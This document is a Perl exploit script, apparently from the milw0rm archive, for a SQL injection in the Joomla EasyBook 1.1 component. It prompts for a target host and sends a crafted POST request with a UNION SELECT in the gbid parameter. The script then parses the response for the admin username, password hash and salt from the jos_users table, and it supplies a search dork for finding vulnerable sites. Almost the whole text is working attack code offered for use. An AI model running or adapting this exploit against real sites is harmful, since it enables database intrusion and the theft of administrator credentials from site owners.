#!/usr/bin/perl
use IO::Socket;
use strict;

##### INFO##############################
# Example:                             #
# Host: xxx.lu  	               #
# &md: 0f8ab366793a0d1da85c6f5a8d4fb576#
########################################


print "-+--[ Joomla Component EasyBook 1.1 SQL Injection Exploit]--+-\n";
print "-+--                                                      --+-\n";
print "-+--            Author: ZAMUT                             --+-\n";
print "-+--            Vuln: gbid=                               --+-\n";
print "-+--            Homepage: http://antichat.ru              --+-\n";
print "-+--            Dork: com_easybook                        --+-\n\n";

print "Host:" ;
chomp(my $host=<STDIN>);
print "&md=";
chomp(my $md=<STDIN>);

my ($socket,$lhs,$l,$h,$s);
$socket = IO::Socket::INET->new("$host:80") || die("Can't connecting!");
print $socket  "POST /index.php HTTP/1.0\n".
               "Host: www.$host\n".
			   "Content-Type: application/x-www-form-urlencoded\n".
			   "Content-Length: 214\n\n".
               "option=com_easybook&Itemid=1&func=deleteentry&gbid=-1+union+select+1,2,concat(0x3A3A3A,username,0x3a,password,0x3A3A3A),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+jos_users/*&md=$md\n";
  while(<$socket>)
  {
	 $s = <$socket>;
	 if($s=~/:::(.+):::/){
		   $lhs = $1;
	       ($l,$h,$s)=split(':',$lhs);
		   print "\nAdmin Login:$l\nHash:$h\nSalt:$s\n";
		   close $socket; 
		   exit; }
  }
  die ("Exploit failed!");

# milw0rm.com [2008-06-04]